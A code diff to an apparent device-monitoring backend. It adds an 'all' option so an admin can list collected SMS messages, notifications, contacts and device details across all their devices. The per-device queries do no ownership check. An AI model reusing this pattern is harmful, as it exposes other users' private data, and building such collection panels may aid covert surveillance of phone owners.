@@ -24,8 +24,14 @@ export const getAllDevices = async (req: Request, res: Response) => {
 
 export const getMessages = async (req: Request, res: Response) => {
     let {deviceID} = req.params;
+    let {username} = req.user;
 
-    const messages = await Message.find({deviceID}).sort({_id: -1}).limit(100).lean();
+    let messages;
+    if (deviceID === "all") {
+        messages = await Message.find({adminID: username}).sort({_id: -1}).limit(100).lean();
+    } else {
+        messages = await Message.find({deviceID}).sort({_id: -1}).limit(100).lean();
+    }
 
     messages.sort((a: any, b: any): number => {
         const parseDate = (str: string): Date => {
@@ -48,8 +54,14 @@ export const getMessages = async (req: Request, res: Response) => {
 
 export const getNotifications = async (req: Request, res: Response) => {
     let {deviceID} = req.params;
+    let {username} = req.user;
 
-    const notifications = await Notification.find({deviceID}).sort({_id: -1}).limit(100).lean();
+    let notifications;
+    if (deviceID === "all") {
+        notifications = await Notification.find({adminID: username}).sort({_id: -1}).limit(100).lean();
+    } else {
+        notifications = await Notification.find({deviceID}).sort({_id: -1}).limit(100).lean();
+    }
 
     notifications.sort((a: any, b: any): number => {
         const parseDate = (str: string): Date => {
@@ -72,8 +84,14 @@ export const getNotifications = async (req: Request, res: Response) => {
 
 export const getContacts = async (req: Request, res: Response) => {
     let {deviceID} = req.params;
+    let {username} = req.user;
 
-    const contacts = await Contact.find({deviceID}).limit(500).lean();
+    let contacts;
+    if (deviceID === "all") {
+        contacts = await Contact.find({adminID: username}).limit(500).lean();
+    } else {
+        contacts = await Contact.find({deviceID}).limit(500).lean();
+    }
 
     respondSuccessWithData(res, contacts);
 };
@@ -124,8 +142,12 @@ export const getLogs = async (req: Request, res: Response) => {
 export const getDetails = async (req: Request, res: Response) => {
     let deviceID = req.params.deviceID;
     let details;
-
-    details = await Detail.find({deviceID}).sort({_id: -1}).limit(100).lean();
+    let {username} = req.user;
+    if (deviceID === "all") {
+        details = await Detail.find({adminID: username}).sort({_id: -1}).limit(100).lean();
+    } else {
+        details = await Detail.find({deviceID}).sort({_id: -1}).limit(100).lean();
+    }
 
     details.sort((a, b) => {
         const parseDate = (str: string) => {
